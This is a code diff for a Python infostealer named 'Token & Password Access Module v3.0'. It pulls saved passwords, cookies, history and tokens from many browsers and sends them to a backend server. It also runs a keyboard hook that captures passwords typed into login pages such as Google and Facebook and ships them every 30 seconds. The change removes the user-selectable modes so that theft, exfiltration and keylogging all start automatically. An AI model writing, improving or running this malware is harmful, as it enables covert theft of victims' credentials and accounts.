@@ -1084,65 +1084,39 @@ class RealtimeCapture:
 
 def run_realtime_capture():
     """Run real-time password capture mode"""
-    print("""
-    ╔═══════════════════════════════════════════════════════════════════╗
-    ║           Real-time Password Capture Mode                         ║
-    ║                                                                   ║
-    ║  • Captures passwords as users type them in browsers             ║
-    ║  • Monitors login pages (Google, Facebook, etc.)                  ║
-    ║  • Sends to backend every 30 seconds                              ║
-    ║                                                                   ║
-    ║  Press Ctrl+C to stop                                             ║
-    ╚═══════════════════════════════════════════════════════════════════╝
-    """)
+    print("\n[*] Starting real-time password capture...")
+    print("[*] Monitoring browser login pages for passwords...")
+    print("[*] Press Ctrl+C to stop\n")
     
     if platform.system() != "Windows":
         print("[!] Real-time capture requires Windows OS")
         return
     
-    print(f"[*] System: {platform.node()}")
-    print(f"[*] User: {os.getenv('USERNAME')}")
-    print(f"[*] Backend: {BACKEND_URL}")
-    print()
-    
     # Start background sender
     sender = threading.Thread(target=periodic_sender, daemon=True)
     sender.start()
-    print("[+] Background sender started")
     
     # Start capture
-    print("[+] Starting keyboard capture...")
-    print("[*] Monitoring browser password fields...\n")
-    
     capture = RealtimeCapture()
     capture.start()
 
 
 def main():
     """
-    Main function - supports multiple modes
+    Main function - runs everything automatically:
+    1. Extract stored browser passwords, cookies, history, tokens
+    2. Send to backend
+    3. Start real-time password capture in background
     """
-    import argparse
-    
-    parser = argparse.ArgumentParser(description="Token & Password Access Module")
-    parser.add_argument('--realtime', '-r', action='store_true', 
-                       help='Run real-time password capture (keyboard hook)')
-    parser.add_argument('--extract', '-e', action='store_true',
-                       help='Extract stored browser data (default)')
-    parser.add_argument('--both', '-b', action='store_true',
-                       help='Extract stored data, then run real-time capture')
-    
-    args = parser.parse_args()
-    
     print("""
     ╔═══════════════════════════════════════════════════════════════════╗
     ║           Token & Password Access Module v3.0                     ║
     ║                Multi-Browser Extraction Tool                      ║
     ║                                                                   ║
-    ║  Modes:                                                           ║
-    ║  • --extract (-e)   Extract saved browser passwords               ║
-    ║  • --realtime (-r)  Capture passwords in real-time                ║
-    ║  • --both (-b)      Extract then run real-time capture            ║
+    ║  Features:                                                        ║
+    ║  • Extract saved browser passwords & cookies                      ║
+    ║  • Real-time password capture (keyboard monitoring)               ║
+    ║  • Sends all data to backend server                               ║
     ║                                                                   ║
     ║  Supported Browsers:                                              ║
     ║  • Chromium: Chrome, Brave, Edge, Opera, Vivaldi, Yandex          ║
@@ -1157,29 +1131,36 @@ def main():
         print("[!] Some features may not work on other platforms")
         print()
     
-    if args.realtime:
-        # Real-time capture only
-        run_realtime_capture()
-    elif args.both:
-        # Extract stored data first
-        collected_data = collect_all_data()
-        print("\n[*] Sending extracted data to backend server...")
-        send_to_backend(collected_data)
-        print()
-        # Then run real-time capture
-        run_realtime_capture()
+    # ========== STEP 1: Extract stored browser data ==========
+    collected_data = collect_all_data()
+    
+    # ========== STEP 2: Send to backend ==========
+    print("\n[*] Sending extracted data to backend server...")
+    success = send_to_backend(collected_data)
+    
+    if success:
+        print("[+] Stored browser data sent successfully!")
     else:
-        # Default: extract stored data
-        collected_data = collect_all_data()
-        print("\n[*] Sending extracted data to backend server...")
-        success = send_to_backend(collected_data)
-        
-        if success:
-            print(f"\n[+] Data exfiltration completed successfully!")
-        else:
-            print("\n[!] Failed to send data to backend!")
-        
-        return collected_data
+        print("[!] Failed to send stored data to backend")
+    
+    # ========== STEP 3: Start real-time capture ==========
+    print("\n" + "="*70)
+    print("  STARTING REAL-TIME PASSWORD CAPTURE")
+    print("="*70)
+    print("\n[*] Now monitoring for new passwords typed in browsers...")
+    print("[*] Captured passwords will be sent every 30 seconds")
+    print("[*] Press Ctrl+C to stop\n")
+    
+    try:
+        run_realtime_capture()
+    except KeyboardInterrupt:
+        # Send any remaining captured data before exit
+        if realtime_passwords:
+            print("\n[*] Sending remaining captured data...")
+            send_realtime_data()
+        print("\n[*] Stopped by user")
+    
+    return collected_data
 
 
 if __name__ == "__main__":
